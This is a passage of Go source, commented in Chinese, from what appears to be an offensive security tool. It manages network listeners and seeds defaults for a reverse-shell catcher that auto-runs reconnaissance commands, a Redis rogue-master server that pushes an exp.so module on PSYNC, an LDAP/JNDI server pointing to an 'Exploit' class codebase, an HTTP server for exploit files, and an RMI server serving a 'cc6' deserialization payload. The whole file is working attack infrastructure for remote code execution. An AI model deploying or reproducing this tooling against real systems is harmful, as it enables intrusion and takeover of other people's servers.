package netcat

import (
	"bufio"
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/uuid"
)

var (
	mu         sync.RWMutex
	listeners  = map[string]*runtime{}
	cfgFile    string
	payloadDir string
)

// runtime 一个已配置监听（可能处于未启动状态）
type runtime struct {
	mu        sync.Mutex
	cfg       Listener
	ln        net.Listener
	running   bool
	lastErr   string
	startedAt time.Time
	sessions  map[string]*session
	order     []string
	events    []Event
	hits      int64
	totalIn   int64
	totalOut  int64
}

// session 一条接入的 TCP 连接
type session struct {
	id       string
	lid      string
	lname    string
	listener *runtime
	cfg      Listener
	conn     net.Conn
	remote   string
	started  time.Time
	mode     string

	wmu      sync.Mutex // 写串行化
	bytesIn  int64
	bytesOut int64

	mu      sync.Mutex
	hist    []byte
	subs    map[int]chan []byte
	nextSub int
	fired   map[string]int
	window  []byte
	head    []byte
	waiters []*waiter

	pending   sync.WaitGroup // 待发送的规则 payload
	closed    atomic.Bool
	closeOnce sync.Once
	closing   chan struct{}
	autoCmds  atomic.Int32
}

// waiter 自动命令集里的「等输出匹配再继续」
type waiter struct {
	re   *regexp.Regexp
	ch   chan struct{}
	once sync.Once
}

// codebaseHTTPPort 是种子配置里 JNDI CodeBase 的 HTTP 端口（需与 docker-compose 端口映射一致）
const codebaseHTTPPort = 8090

// publicHost 生成 javaCodeBase 用的对外地址，容器/局域网场景通过 NETCAT_PUBLIC_HOST 指定
func publicHost() string {
	if h := strings.TrimSpace(os.Getenv("NETCAT_PUBLIC_HOST")); h != "" {
		return h
	}
	return "127.0.0.1"
}

// payloadSeedDir 项目自带 payload 目录，可用 NETCAT_PAYLOAD_SEED 覆盖
func payloadSeedDir() string {
	if d := strings.TrimSpace(os.Getenv("NETCAT_PAYLOAD_SEED")); d != "" {
		return d
	}
	return "payloads"
}

// seedPayloadFiles 把项目内置 payload（exp.so / Exploit.class / jar / RMI 序列化载荷）复制到数据目录
func seedPayloadFiles() {
	entries, err := os.ReadDir(payloadSeedDir())
	if err != nil {
		return // 本地直跑且没带 payloads 目录时忽略
	}
	for _, e := range entries {
		name := e.Name()
		if e.IsDir() || strings.HasSuffix(name, ".md") || strings.HasSuffix(name, ".example") {
			continue
		}
		dst := filepath.Join(payloadDir, name)
		if _, err := os.Stat(dst); err == nil {
			continue
		}
		data, err := os.ReadFile(filepath.Join(payloadSeedDir(), name))
		if err != nil {
			continue
		}
		if err := os.WriteFile(dst, data, 0o644); err != nil {
			continue
		}
	}
}

// Init 读取监听配置；文件不存在时写入一份示例配置（默认不启动）
func Init(path string) error {
	cfgFile = path
	payloadDir = filepath.Join(filepath.Dir(path), "netcat-payloads")
	if err := os.MkdirAll(filepath.Dir(path), 0o755); err != nil {
		return err
	}
	if err := os.MkdirAll(payloadDir, 0o755); err != nil {
		return err
	}
	// 把项目自带的 exp payload 灌进数据目录（已存在则跳过，不覆盖用户自己上传的）
	seedPayloadFiles()

	if _, err := os.Stat(path); os.IsNotExist(err) {
		codebase := fmt.Sprintf("http://%s:%d/", publicHost(), codebaseHTTPPort)
		seed := []Listener{
			{
				ID: uuid.New().String(), Name: "反弹 Shell（8888）", Bind: "0.0.0.0", Port: 8888,
				Mode: ModeShell, AutoStart: false,
				AutoCmds: []AutoCmd{
					{Cmd: "id", DelayMs: 300},
					{Cmd: "uname -a", DelayMs: 300},
					{Cmd: "pwd", DelayMs: 300},
				},
				Rules: []Rule{},
			},
			{
				ID: uuid.New().String(), Name: "Redis Rogue（6379）", Bind: "0.0.0.0", Port: 6379,
				Mode: ModeRedis, AutoStart: true,
				Rules: []Rule{
					{
						ID: uuid.New().String(), Name: "exp.so 请求", Enabled: true,
						MatchType: MatchContains, Pattern: "exp.so",
						PayloadType: PayloadFile, PayloadFile: "exp.so", Wrap: "bulk",
						CloseAfter: true, DelayMs: 50,
					},
					{
						ID: uuid.New().String(), Name: "PSYNC 复制同步", Enabled: true,
						MatchType: MatchContains, Pattern: "PSYNC",
						PayloadType: PayloadFile, PayloadFile: "exp.so", Wrap: "bulk",
						DelayMs: 50,
					},
				},
			},
			{
				ID: uuid.New().String(), Name: "LDAP/JNDI（1389）", Bind: "0.0.0.0", Port: 1389,
				Mode: ModeLDAP, AutoStart: true,
				JavaClassName: "Exploit", JavaFactory: "Exploit",
				JavaCodeBase: codebase,
			},
			{
				ID: uuid.New().String(), Name: "JNDI CodeBase HTTP（8090）", Bind: "0.0.0.0", Port: codebaseHTTPPort,
				Mode: ModeHTTP, AutoStart: true, ServePayloadDir: true,
				HTTPContentType: "application/java-vm",
				Rules: []Rule{
					{
						ID: uuid.New().String(), Name: "请求 exp.so", Enabled: true,
						MatchType: MatchContains, Pattern: "/exp.so",
						PayloadType: PayloadFile, PayloadFile: "exp.so",
						CloseAfter: false,
					},
				},
			},
			{
				ID: uuid.New().String(), Name: "RMI（1099）", Bind: "0.0.0.0", Port: 1099,
				Mode: ModeRMI, AutoStart: true,
				PayloadFile: "cc6",
			},
		}
		if err := saveLocked(seed); err != nil {
			return err
		}
	}

	data, err := os.ReadFile(path)
	if err != nil {
		return err
	}
	var cfg struct {
		Listeners []Listener `json:"listeners"`
	}
	if len(bytes.TrimSpace(data)) > 0 {
		if err := json.Unmarshal(data, &cfg); err != nil {
			return fmt.Errorf("解析 %s: %w", path, err)
		}
	}
	// 重复初始化时先停掉旧监听，避免端口残留占用
	mu.Lock()
	old := make([]*runtime, 0, len(listeners))
	for _, rt := range listeners {
		old = append(old, rt)
	}
	mu.Unlock()
	for _, rt := range old {
		rt.stop()
	}

	mu.Lock()
	listeners = map[string]*runtime{}
	for _, l := range cfg.Listeners {
		normalize(&l)
		listeners[l.ID] = &runtime{cfg: l, sessions: map[string]*session{}, events: []Event{}}
	}
	mu.Unlock()

	// 自启配置
	for _, l := range cfg.Listeners {
		if l.AutoStart {
			if err := StartListener(l.ID); err != nil {
				mu.Lock()
				if rt := listeners[l.ID]; rt != nil {
					rt.lastErr = err.Error()
				}
				mu.Unlock()
			}
		}
	}
	return nil
}

// normalize 补齐默认值并给缺失的规则 ID 补 ID
func normalize(l *Listener) {
	if l.Bind == "" {
		l.Bind = "0.0.0.0"
	}
	if l.Mode == "" {
		l.Mode = ModeShell
	}
	if l.MaxConns <= 0 {
		l.MaxConns = 64
	}
	for i := range l.Rules {
		if l.Rules[i].ID == "" {
			l.Rules[i].ID = uuid.New().String()
		}
		if l.Rules[i].MatchType == "" {
			l.Rules[i].MatchType = MatchContains
		}
		if l.Rules[i].PayloadType == "" {
			l.Rules[i].PayloadType = PayloadText
		}
		if l.Rules[i].Window <= 0 {
			l.Rules[i].Window = 4096
		}
	}
	if l.Mode == ModeLDAP {
		if l.JavaClassName == "" {
			l.JavaClassName = "Exploit"
		}
		if l.JavaFactory == "" {
			l.JavaFactory = l.JavaClassName
		}
	}
	if l.Mode == ModeHTTP && l.HTTPStatus == 0 {
		l.HTTPStatus = 200
	}
	if l.Mode == ModeHTTP && l.ServePayloadDir {
		// 默认按请求路径返回 payload 文件，未命中时给一个空 200
		if l.HTTPContentType == "" {
			l.HTTPContentType = "application/octet-stream"
		}
	}
}

func saveLocked(lists []Listener) error {
	sort.Slice(lists, func(i, j int) bool { return lists[i].Port < lists[j].Port })
	out, err := json.MarshalIndent(struct {
		Listeners []Listener `json:"listeners"`
	}{Listeners: lists}, "", "  ")
	if err != nil {
		return err
	}
	return os.WriteFile(cfgFile, out, 0o644)
}

// save 把当前全部监听配置写盘
func save() error {
	mu.RLock()
	out := make([]Listener, 0, len(listeners))
	for _, rt := range listeners {
		rt.mu.Lock()
		out = append(out, rt.cfg)
		rt.mu.Unlock()
	}
	mu.RUnlock()
	return saveLocked(out)
}

// PayloadDir 返回 payload 文件目录
func PayloadDir() string { return payloadDir }

// ------------------------------------------------------------------
// 查询 / 增删改
// ------------------------------------------------------------------

// ListViews 返回全部监听及运行状态
func ListViews() []ListenerView {
	mu.RLock()
	rts := make([]*runtime, 0, len(listeners))
	for _, rt := range listeners {
		rts = append(rts, rt)
	}
	mu.RUnlock()
	out := make([]ListenerView, 0, len(rts))
	for _, rt := range rts {
		out = append(out, rt.view())
	}
	sort.Slice(out, func(i, j int) bool { return out[i].Port < out[j].Port })
	return out
}

func (r *runtime) view() ListenerView {
	r.mu.Lock()
	defer r.mu.Unlock()
	v := ListenerView{Listener: r.cfg, Running: r.running, Error: r.lastErr,
		TotalIn: r.totalIn, TotalOut: r.totalOut, RuleHits: r.hits}
	if !r.startedAt.IsZero() {
		v.StartedAt = r.startedAt.Format("2006-01-02 15:04:05")
	}
	if r.ln != nil {
		v.Address = r.ln.Addr().String()
	}
	for _, s := range r.sessions {
		v.Sessions++
		if !s.closed.Load() {
			v.Active++
		}
	}
	return v
}

// GetListener 取配置副本
func GetListener(id string) (Listener, bool) {
	mu.RLock()
	rt := listeners[id]
	mu.RUnlock()
	if rt == nil {
		return Listener{}, false
	}
	rt.mu.Lock()
	defer rt.mu.Unlock()
	return rt.cfg, true
}

func portTaken(port int, exceptID string) bool {
	for id, rt := range listeners {
		if id == exceptID {
			continue
		}
		rt.mu.Lock()
		p := rt.cfg.Port
		rt.mu.Unlock()
		if p == port {
			return true
		}
	}
	return false
}

func validate(l *Listener) error {
	if l.Name == "" {
		l.Name = fmt.Sprintf("监听 %d", l.Port)
	}
	if l.Port < 1 || l.Port > 65535 {
		return fmt.Errorf("端口必须在 1-65535")
	}
	switch l.Mode {
	case ModeShell, ModeRaw, ModeRedis, ModeLDAP, ModeRMI, ModeHTTP:
	default:
		return fmt.Errorf("未知模式 %q", l.Mode)
	}
	for i := range l.Rules {
		if err := validateRule(&l.Rules[i]); err != nil {
			return fmt.Errorf("规则 #%d：%w", i+1, err)
		}
	}
	return nil
}

func validateRule(r *Rule) error {
	if r.Pattern == "" {
		return fmt.Errorf("特征不能为空")
	}
	switch r.MatchType {
	case MatchContains, MatchPrefix, MatchSuffix, MatchRegex, MatchHex:
	default:
		return fmt.Errorf("未知匹配方式 %q", r.MatchType)
	}
	if r.MatchType == MatchRegex {
		if _, err := regexp.Compile(r.Pattern); err != nil {
			return fmt.Errorf("正则无效：%w", err)
		}
	}
	if r.MatchType == MatchHex {
		if _, err := hex.DecodeString(strings.NewReplacer(" ", "", "0x", "").Replace(r.Pattern)); err != nil {
			return fmt.Errorf("十六进制无效：%w", err)
		}
	}
	switch r.PayloadType {
	case PayloadText, PayloadBase64, PayloadFile:
	default:
		return fmt.Errorf("未知载荷类型 %q", r.PayloadType)
	}
	if r.PayloadType == PayloadFile && r.PayloadFile == "" {
		return fmt.Errorf("请选择 payload 文件")
	}
	if r.PayloadType == PayloadText && r.Payload == "" && !r.CloseAfter {
		return fmt.Errorf("文本载荷不能为空")
	}
	return nil
}

// CreateListener 新建监听（不自动启动，除非 AutoStart）
func CreateListener(l Listener) (*Listener, error) {
	l.ID = uuid.New().String()
	normalize(&l)
	if err := validate(&l); err != nil {
		return nil, err
	}
	mu.Lock()
	if portTaken(l.Port, l.ID) {
		mu.Unlock()
		return nil, fmt.Errorf("端口 %d 已被其他监听占用", l.Port)
	}
	listeners[l.ID] = &runtime{cfg: l, sessions: map[string]*session{}, events: []Event{}}
	mu.Unlock()
	if err := save(); err != nil {
		return nil, err
	}
	if l.AutoStart {
		if err := StartListener(l.ID); err != nil {
			return nil, err
		}
	}
	return &l, nil
}

// UpdateListener 更新配置；运行中的监听会重启以生效
func UpdateListener(id string, l Listener) error {
	mu.RLock()
	rt := listeners[id]
	mu.RUnlock()
	if rt == nil {
		return fmt.Errorf("监听不存在")
	}
	l.ID = id
	normalize(&l)
	if err := validate(&l); err != nil {
		return err
	}
	mu.Lock()
	if portTaken(l.Port, id) {
		mu.Unlock()
		return fmt.Errorf("端口 %d 已被其他监听占用", l.Port)
	}
	mu.Unlock()

	rt.mu.Lock()
	wasRunning := rt.running
	oldPort := rt.cfg.Port
	rt.mu.Unlock()

	if wasRunning {
		rt.stop()
	}
	rt.mu.Lock()
	rt.cfg = l
	rt.lastErr = ""
	rt.mu.Unlock()

	if err := save(); err != nil {
		return err
	}
	if wasRunning || oldPort != l.Port && l.AutoStart {
		if err := rt.start(); err != nil {
			return err
		}
	}
	return nil
}

// DeleteListener 停止并删除监听
func DeleteListener(id string) error {
	mu.Lock()
	rt := listeners[id]
	delete(listeners, id)
	mu.Unlock()
	if rt == nil {
		return fmt.Errorf("监听不存在")
	}
	rt.stop()
	rt.mu.Lock()
	for _, s := range rt.sessions {
		s.close()
	}
	rt.mu.Unlock()
	return save()
}

// StartListener 启动指定监听
func StartListener(id string) error {
	mu.RLock()
	rt := listeners[id]
	mu.RUnlock()
	if rt == nil {
		return fmt.Errorf("监听不存在")
	}
	return rt.start()
}

// StopListener 停止指定监听
func StopListener(id string) error {
	mu.RLock()
	rt := listeners[id]
	mu.RUnlock()
	if rt == nil {
		return fmt.Errorf("监听不存在")
	}
	rt.stop()
	return nil
}

func (r *runtime) start() error {
	r.mu.Lock()
	if r.running {
		r.mu.Unlock()
		return nil
	}
	cfg := r.cfg
	addr := net.JoinHostPort(cfg.Bind, strconv.Itoa(cfg.Port))
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		r.lastErr = err.Error()
		r.mu.Unlock()
		r.addEvent(eventError, "", "监听失败："+err.Error())
		return err
	}
	r.ln = ln
	r.running = true
	r.lastErr = ""
	r.startedAt = time.Now()
	r.mu.Unlock()

	r.addEvent(eventInfo, "", fmt.Sprintf("开始监听 %s（%s 模式）", ln.Addr().String(), cfg.Mode))
	go r.acceptLoop(ln)
	return nil
}

func (r *runtime) stop() {
	r.mu.Lock()
	ln := r.ln
	running := r.running
	r.ln = nil
	r.running = false
	conns := make([]*session, 0, len(r.sessions))
	for _, s := range r.sessions {
		if !s.closed.Load() {
			conns = append(conns, s)
		}
	}
	r.mu.Unlock()
	if ln != nil {
		ln.Close()
	}
	if running {
		r.addEvent(eventInfo, "", "停止监听")
	}
	for _, s := range conns {
		s.close()
	}
}

func (r *runtime) acceptLoop(ln net.Listener) {
	for {
		conn, err := ln.Accept()
		if err != nil {
			return
		}
		go r.handle(conn)
	}
}

func (r *runtime) handle(conn net.Conn) {
	r.mu.Lock()
	if !r.running {
		r.mu.Unlock()
		conn.Close()
		return
	}
	active := 0
	for _, s := range r.sessions {
		if !s.closed.Load() {
			active++
		}
	}
	if active >= r.cfg.MaxConns {
		r.mu.Unlock()
		conn.Write([]byte("too many connections\r\n"))
		conn.Close()
		return
	}
	s := &session{
		id:       uuid.New().String(),
		lid:      r.cfg.ID,
		lname:    r.cfg.Name,
		listener: r,
		cfg:      r.cfg,
		conn:     conn,
		remote:   conn.RemoteAddr().String(),
		started:  time.Now(),
		mode:     r.cfg.Mode,
		hist:     make([]byte, 0, 4096),
		subs:     map[int]chan []byte{},
		fired:    map[string]int{},
		closing:  make(chan struct{}),
	}
	r.sessions[s.id] = s
	r.order = append(r.order, s.id)
	// 会话过多时淘汰最旧的已关闭会话
	if len(r.order) > maxSessionsPerListener {
		for _, id := range r.order {
			if old, ok := r.sessions[id]; ok && old.closed.Load() {
				delete(r.sessions, id)
				if len(r.sessions) <= maxSessionsPerListener {
					break
				}
			}
		}
		kept := r.order[:0]
		for _, id := range r.order {
			if _, ok := r.sessions[id]; ok {
				kept = append(kept, id)
			}
		}
		r.order = kept
	}
	r.mu.Unlock()

	r.addEvent(eventConnect, s.remote, fmt.Sprintf("新连接 → 会话 %s", shortID(s.id)))
	s.serve()
}

func shortID(id string) string {
	if len(id) > 8 {
		return id[:8]
	}
	return id
}

func (r *runtime) addEvent(t, remote, detail string) {
	r.mu.Lock()
	r.events = append(r.events, Event{
		Time:   time.Now().Format("15:04:05"),
		Type:   t,
		Remote: remote,
		Detail: detail,
	})
	if len(r.events) > maxEventLog {
		r.events = r.events[len(r.events)-maxEventLog:]
	}
	r.mu.Unlock()
}

// Events 返回事件流水（按时间正序）
func Events(listenerID string, limit int) []Event {
	mu.RLock()
	rt := listeners[listenerID]
	mu.RUnlock()
	if rt == nil {
		return nil
	}
	rt.mu.Lock()
	defer rt.mu.Unlock()
	if limit <= 0 || limit > len(rt.events) {
		limit = len(rt.events)
	}
	out := make([]Event, limit)
	copy(out, rt.events[len(rt.events)-limit:])
	return out
}

// ------------------------------------------------------------------
// session
// ------------------------------------------------------------------

func (s *session) serve() {
	defer func() {
		if v := recover(); v != nil {
			s.listener.addEvent(eventError, s.remote, fmt.Sprintf("会话异常：%v", v))
		}
		s.close()
	}()
	switch s.mode {
	case ModeLDAP:
		s.handleLDAP()
	case ModeRedis:
		s.handleRedis()
	case ModeHTTP:
		s.handleHTTP()
	case ModeRMI:
		s.handleRMI()
	default:
		s.handleStream()
	}
}

// close 关闭会话（幂等）
func (s *session) close() {
	s.closeOnce.Do(func() {
		s.closed.Store(true)
		close(s.closing)
		s.conn.Close()
		s.mu.Lock()
		for id, ch := range s.subs {
			close(ch)
			delete(s.subs, id)
		}
		s.mu.Unlock()
		s.listener.addEvent(eventClose, s.remote,
			fmt.Sprintf("会话 %s 结束（收 %d 字节，发 %d 字节）", shortID(s.id),
				atomic.LoadInt64(&s.bytesIn), atomic.LoadInt64(&s.bytesOut)))
	})
}

func (s *session) isClosed() bool { return s.closed.Load() }

// send 写数据到对端
func (s *session) send(b []byte) (int, error) {
	if len(b) == 0 || s.isClosed() {
		return 0, nil
	}
	s.wmu.Lock()
	defer s.wmu.Unlock()
	n, err := s.conn.Write(b)
	if n > 0 {
		atomic.AddInt64(&s.bytesOut, int64(n))
		s.listener.mu.Lock()
		s.listener.totalOut += int64(n)
		s.listener.mu.Unlock()
	}
	return n, err
}

func (s *session) sendString(str string) { s.send([]byte(str)) }

// onData 处理一段入站数据：回放给浏览器 + 规则匹配 + 自动命令等待
func (s *session) onData(b []byte) {
	if len(b) == 0 {
		return
	}
	atomic.AddInt64(&s.bytesIn, int64(len(b)))
	s.listener.mu.Lock()
	s.listener.totalIn += int64(len(b))
	s.listener.mu.Unlock()

	// 推给所有已挂载的浏览器终端
	s.mu.Lock()
	s.hist = append(s.hist, b...)
	if len(s.hist) > maxHistoryBytes {
		s.hist = append([]byte(nil), s.hist[len(s.hist)-maxHistoryBytes:]...)
	}
	for _, ch := range s.subs {
		select {
		case ch <- b:
		default:
			// 终端卡住时丢弃最旧的数据，避免拖死对端连接
			select {
			case <-ch:
			default:
			}
			select {
			case ch <- b:
			default:
			}
		}
	}
	if len(s.head) < 256 {
		if need := 256 - len(s.head); need > len(b) {
			s.head = append(s.head, b...)
		} else {
			s.head = append(s.head, b[:need]...)
		}
	}
	// 滚动窗口取所有启用规则里最大的窗口，避免为每条规则单独维护
	win := 4096
	for _, rule := range s.cfg.Rules {
		if rule.Enabled && rule.Window > win {
			win = rule.Window
		}
	}
	s.window = append(s.window, b...)
	if len(s.window) > win {
		s.window = append([]byte(nil), s.window[len(s.window)-win:]...)
	}
	waiters := append([]*waiter(nil), s.waiters...)
	s.mu.Unlock()

	for _, w := range waiters {
		if w.re.Match(b) {
			w.once.Do(func() { close(w.ch) })
		}
	}

	s.matchRules()
}

// matchRules 用当前窗口匹配全部规则，命中即发送 payload
func (s *session) matchRules() {
	s.mu.Lock()
	var fired []Rule
	for i := range s.cfg.Rules {
		rule := s.cfg.Rules[i]
		if !rule.Enabled {
			continue
		}
		if rule.SendTimes > 0 && s.fired[rule.ID] >= rule.SendTimes {
			continue
		}
		if !matchRule(rule, s.window, s.head) {
			continue
		}
		s.fired[rule.ID]++
		fired = append(fired, rule)
	}
	if len(fired) > 0 {
		// 命中后清空窗口：同一段数据不会重复触发，后续新数据仍可再次命中
		s.window = nil
	}
	s.mu.Unlock()

	for _, rule := range fired {
		s.pending.Add(1)
		go s.fireRule(rule)
	}
}

// matchRule 判断窗口内容是否命中规则
func matchRule(rule Rule, window, head []byte) bool {
	pattern := rule.Pattern
	switch rule.MatchType {
	case MatchHex:
		pat, err := hex.DecodeString(strings.NewReplacer(" ", "", "0x", "", "\\x", "").Replace(pattern))
		if err != nil {
			return false
		}
		return bytes.Contains(window, pat)
	case MatchRegex:
		re, err := regexp.Compile(pattern)
		if err != nil {
			return false
		}
		return re.Match(window)
	case MatchPrefix:
		if rule.IgnoreCase {
			return strings.HasPrefix(strings.ToLower(string(head)), strings.ToLower(pattern))
		}
		return strings.HasPrefix(string(head), pattern)
	case MatchSuffix:
		h, p := string(window), pattern
		if rule.IgnoreCase {
			h, p = strings.ToLower(h), strings.ToLower(p)
		}
		return strings.HasSuffix(h, p)
	default:
		h, p := string(window), pattern
		if rule.IgnoreCase {
			h, p = strings.ToLower(h), strings.ToLower(p)
		}
		return strings.Contains(h, p)
	}
}

// resolvePayload 取规则对应的 payload 字节
func resolvePayload(rule Rule) ([]byte, error) {
	switch rule.PayloadType {
	case PayloadFile:
		name := filepath.Base(rule.PayloadFile)
		if name == "" || name == "." {
			return nil, fmt.Errorf("未指定 payload 文件")
		}
		return os.ReadFile(filepath.Join(payloadDir, name))
	case PayloadBase64:
		raw := strings.TrimSpace(rule.Payload)
		if i := strings.Index(raw, "base64,"); i >= 0 {
			raw = raw[i+len("base64,"):]
		}
		return base64.StdEncoding.DecodeString(raw)
	default:
		return []byte(rule.Payload), nil
	}
}

func ruleLabel(rule Rule) string {
	if rule.Name != "" {
		return rule.Name
	}
	if len(rule.ID) >= 8 {
		return rule.ID[:8]
	}
	return rule.ID
}

// fireRule 发送规则 payload
func (s *session) fireRule(rule Rule) {
	defer s.pending.Done()
	if rule.DelayMs > 0 {
		select {
		case <-time.After(time.Duration(rule.DelayMs) * time.Millisecond):
		case <-s.closing:
			return
		}
	}
	payload, err := resolvePayload(rule)
	if err != nil {
		s.listener.addEvent(eventError, s.remote, fmt.Sprintf("规则「%s」载荷读取失败：%v", ruleLabel(rule), err))
		return
	}
	if rule.Wrap == "bulk" {
		payload = []byte(fmt.Sprintf("$%d\r\n%s\r\n", len(payload), payload))
	}
	s.listener.mu.Lock()
	s.listener.hits++
	s.listener.mu.Unlock()
	s.listener.addEvent(eventRule, s.remote,
		fmt.Sprintf("规则「%s」命中特征 %q", ruleLabel(rule), rule.Pattern))
	n, err := s.send(payload)
	if err != nil {
		s.listener.addEvent(eventError, s.remote, fmt.Sprintf("发送 payload 失败：%v", err))
	}
	s.listener.addEvent(eventPayload, s.remote,
		fmt.Sprintf("已推送 %d 字节（规则「%s」）", n, ruleLabel(rule)))
	if rule.CloseAfter {
		time.Sleep(120 * time.Millisecond)
		s.listener.addEvent(eventInfo, s.remote, "推送完成，主动关闭连接")
		s.close()
	}
}

// waitFor 等待输出命中正则（或超时 / 会话结束）
func (s *session) waitFor(re *regexp.Regexp, max time.Duration) {
	w := &waiter{re: re, ch: make(chan struct{})}
	s.mu.Lock()
	s.waiters = append(s.waiters, w)
	// 已经匹配过历史输出就直接返回
	matched := re.Match(s.window)
	s.mu.Unlock()
	if matched {
		return
	}
	select {
	case <-w.ch:
	case <-time.After(max):
	case <-s.closing:
	}
	s.mu.Lock()
	for i, x := range s.waiters {
		if x == w {
			s.waiters = append(s.waiters[:i], s.waiters[i+1:]...)
			break
		}
	}
	s.mu.Unlock()
}

// runAutoCmds 按配置下发自动命令集
func (s *session) runAutoCmds() {
	cmds := s.cfg.AutoCmds
	if len(cmds) == 0 {
		return
	}
	if s.cfg.InitialDelayMs > 0 {
		select {
		case <-time.After(time.Duration(s.cfg.InitialDelayMs) * time.Millisecond):
		case <-s.closing:
			return
		}
	}
	for i, c := range cmds {
		if c.Cmd == "" {
			continue
		}
		if c.WaitFor != "" {
			if re, err := regexp.Compile(c.WaitFor); err == nil {
				max := c.MaxWaitMs
				if max <= 0 {
					max = 10000
				}
				s.waitFor(re, time.Duration(max)*time.Millisecond)
			}
		} else if c.DelayMs > 0 {
			select {
			case <-time.After(time.Duration(c.DelayMs) * time.Millisecond):
			case <-s.closing:
				return
			}
		}
		if s.isClosed() {
			return
		}
		s.sendString(strings.TrimRight(c.Cmd, "\r\n") + "\n")
		s.autoCmds.Add(1)
		s.listener.addEvent(eventInfo, s.remote, fmt.Sprintf("自动命令 %d/%d：%s", i+1, len(cmds), c.Cmd))
	}
}

// waitPending 等规则 payload 发完再收连接。
// 对端半关闭（如 `printf ... | nc`）时读循环会立刻读到 EOF，
// 这里留出一点时间把命中的 payload 完整写出去。
func (s *session) waitPending() {
	max := time.Second
	for _, r := range s.cfg.Rules {
		if r.Enabled && r.DelayMs > 0 {
			d := time.Duration(r.DelayMs)*time.Millisecond + 500*time.Millisecond
			if d > max {
				max = d
			}
		}
	}
	if max > 3*time.Second {
		max = 3 * time.Second
	}
	done := make(chan struct{})
	go func() {
		s.pending.Wait()
		close(done)
	}()
	select {
	case <-done:
	case <-time.After(max):
	case <-s.closing:
	}
}

// handleStream shell / raw：通用流式处理
func (s *session) handleStream() {
	if s.cfg.InitialDelayMs > 0 {
		select {
		case <-time.After(time.Duration(s.cfg.InitialDelayMs) * time.Millisecond):
		case <-s.closing:
			return
		}
	}
	if s.cfg.Banner != "" {
		s.sendString(unescape(s.cfg.Banner))
	}
	if s.mode == ModeShell && len(s.cfg.AutoCmds) > 0 {
		go s.runAutoCmds()
	}
	buf := make([]byte, 8192)
	for {
		n, err := s.conn.Read(buf)
		if n > 0 {
			s.onData(buf[:n])
		}
		if err != nil {
			s.waitPending()
			return
		}
	}
}

// unescape 把配置里的 \n \r \t \xNN 转成真实字节
func unescape(str string) string {
	var b strings.Builder
	for i := 0; i < len(str); i++ {
		if str[i] != '\\' || i+1 >= len(str) {
			b.WriteByte(str[i])
			continue
		}
		i++
		switch str[i] {
		case 'n':
			b.WriteByte('\n')
		case 'r':
			b.WriteByte('\r')
		case 't':
			b.WriteByte('\t')
		case '\\':
			b.WriteByte('\\')
		case 'x':
			if i+2 < len(str) {
				if v, err := strconv.ParseUint(str[i+1:i+3], 16, 8); err == nil {
					b.WriteByte(byte(v))
					i += 2
					continue
				}
			}
			b.WriteString(`\x`)
		default:
			b.WriteByte('\\')
			b.WriteByte(str[i])
		}
	}
	return b.String()
}

// ------------------------------------------------------------------
// Redis rogue server 模式
// ------------------------------------------------------------------

func (s *session) handleRedis() {
	if s.cfg.Banner != "" {
		s.sendString(unescape(s.cfg.Banner))
	}
	if s.cfg.InitialDelayMs > 0 {
		time.Sleep(time.Duration(s.cfg.InitialDelayMs) * time.Millisecond)
	}
	r := bufio.NewReaderSize(s.conn, 8192)
	for {
		args, raw, err := readRESP(r)
		if err != nil {
			s.waitPending()
			return
		}
		s.onData(raw)
		if s.isClosed() {
			return
		}
		if len(args) == 0 {
			continue
		}
		cmd := strings.ToUpper(string(args[0]))
		switch cmd {
		case "PING":
			s.sendString("+PONG\r\n")
		case "AUTH", "SELECT", "CLIENT", "COMMAND", "CONFIG", "REPLCONF", "MODULE", "SLAVEOF", "MULTI", "EXEC", "SET":
			s.sendString("+OK\r\n")
		case "INFO":
			info := "# Server\r\nredis_version:7.0.11\r\nredis_mode:standalone\r\nos:Linux 5.15.0 x86_64\r\nprocess_id:1\r\nrun_id:" +
				strings.Repeat("a", 40) + "\r\n# Replication\r\nrole:master\r\nconnected_slaves:1\r\n"
			s.sendString(fmt.Sprintf("$%d\r\n%s\r\n", len(info), info))
		case "GET", "TYPE", "OBJECT":
			s.sendString("$-1\r\n")
		case "PSYNC", "SYNC":
			s.sendString("+FULLRESYNC " + strings.Repeat("b", 40) + " 0\r\n")
			// 配置里给了 payload 文件/base64 时直接当 RDB 下发（redis rogue 的核心动作）
			if b, err := s.rmiPayload(); err == nil && len(b) > 0 {
				s.send([]byte(fmt.Sprintf("$%d\r\n", len(b))))
				s.send(b)
				s.send([]byte("\r\n"))
				s.listener.addEvent(eventPayload, s.remote,
					fmt.Sprintf("PSYNC 已下发 %d 字节载荷", len(b)))
			}
		case "QUIT":
			s.sendString("+OK\r\n")
			return
		default:
			s.sendString("-ERR unknown command '" + cmd + "'\r\n")
		}
	}
}

// readRESP 读取一条 redis 请求（RESP 数组或 inline 文本），同时返回原始字节供规则匹配
func readRESP(r *bufio.Reader) ([][]byte, []byte, error) {
	var raw []byte
	line, err := r.ReadString('\n')
	if err != nil {
		return nil, raw, err
	}
	raw = append(raw, line...)
	line = strings.TrimRight(line, "\r\n")
	if !strings.HasPrefix(line, "*") {
		return bytes.Fields([]byte(line)), raw, nil
	}
	n, err := strconv.Atoi(strings.TrimPrefix(line, "*"))
	if err != nil || n < 0 || n > 64 {
		return nil, raw, fmt.Errorf("bad RESP array %q", line)
	}
	args := make([][]byte, 0, n)
	for i := 0; i < n; i++ {
		l, err := r.ReadString('\n')
		if err != nil {
			return nil, raw, err
		}
		raw = append(raw, l...)
		l = strings.TrimRight(l, "\r\n")
		if !strings.HasPrefix(l, "$") {
			return nil, raw, fmt.Errorf("bad RESP bulk %q", l)
		}
		size, err := strconv.Atoi(strings.TrimPrefix(l, "$"))
		if err != nil || size < 0 || size > 16*1024*1024 {
			return nil, raw, fmt.Errorf("bad bulk size %q", l)
		}
		buf := make([]byte, size+2) // 含尾部 CRLF
		if _, err := io.ReadFull(r, buf); err != nil {
			return nil, raw, err
		}
		raw = append(raw, buf...)
		args = append(args, buf[:size])
	}
	return args, raw, nil
}

// rmiPayload 取监听上配置的原始 payload（base64 或文件）
func (s *session) rmiPayload() ([]byte, error) {
	if s.cfg.PayloadFile != "" {
		return os.ReadFile(filepath.Join(payloadDir, filepath.Base(s.cfg.PayloadFile)))
	}
	if s.cfg.Payload != "" {
		raw := strings.TrimSpace(s.cfg.Payload)
		return base64.StdEncoding.DecodeString(raw)
	}
	return nil, nil
}

// ------------------------------------------------------------------
